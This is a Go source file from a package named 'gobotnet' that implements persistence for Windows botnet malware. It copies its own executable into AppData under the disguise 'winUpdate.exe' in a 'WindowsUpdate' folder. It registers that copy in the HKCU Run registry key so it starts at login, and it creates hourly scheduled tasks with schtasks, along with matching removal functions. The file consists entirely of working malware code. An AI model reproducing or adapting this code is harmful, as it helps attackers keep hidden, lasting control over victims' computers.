package gobotnet

import (
	"golang.org/x/sys/windows/registry"
	"os"
)

var (
	programName        string = "winUpdate"
	copyProgramDir     string = os.Getenv("APPDATA") + `\WindowsUpdate`
	copyExecFilePath   string = copyProgramDir + `\` + programName + ".exe"
	tokenFile          string = copyProgramDir + `\` + programName + ".txt"
	sourceExecFilePath string = os.Args[0]
	token              string = ""
)

func RegistrationTest() {
	OutMessage("Test Registration Start")
	OutMessage("Test Registration End")
}

func RegisterProgram() {
	CreateDir(copyProgramDir, 0777)
	CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
	RegisterAutoRun()
}

func UnRegisterProgram() {
	UnRegisterAutoRun()
	DeleteFile(sourceExecFilePath)
	RemoveDirWithContent(copyProgramDir)
}

func RegisterAutoRun() error {
	err := WriteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName, copyExecFilePath)
	return err
}

func IsRegisterAutoRun() bool {
	return CheckSetValueRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName)
}

func UnRegisterAutoRun() {
	DeleteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName)
}

func RegisterSchedule(nameTask string, pathToFile string) ([]byte, error) {
	return CmdExec("schtasks /create /f /tn " + nameTask + " /sc hourly /mo 1 /tr " + pathToFile)
}

func IsRegisterSchedule(nameTask string) ([]byte, error) {
	return CmdExec("schtasks /query /tn " + nameTask + "\"")
}

func UnRegisterSchedule(nameTask string) ([]byte, error) {
	return CmdExec("schtasks /delete /f /tn " + nameTask)
}
